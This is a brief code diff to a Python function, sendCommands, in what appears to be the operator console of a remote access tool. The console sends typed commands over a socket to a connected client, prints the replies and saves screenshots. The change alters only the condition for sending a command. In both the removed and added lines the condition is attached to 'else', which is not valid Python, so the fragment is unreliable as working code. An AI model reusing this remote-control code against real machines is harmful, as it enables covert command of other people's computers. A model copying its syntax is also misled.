@@ -183,7 +183,7 @@ def sendCommands(conn):
             img.save(imgname)
             print(GREEN + BOLD + '[*] Screenshot output in ' + END + CYAN + imgname + END)
             print('                     ')
-        else len(cmd) > 1:
+        else len(str.encode(cmd)) > 0:
             conn.send(str.encode(cmd))
             clientResponse = str(conn.recv(1024), "utf-8")
             print('\n' + clientResponse, end="")
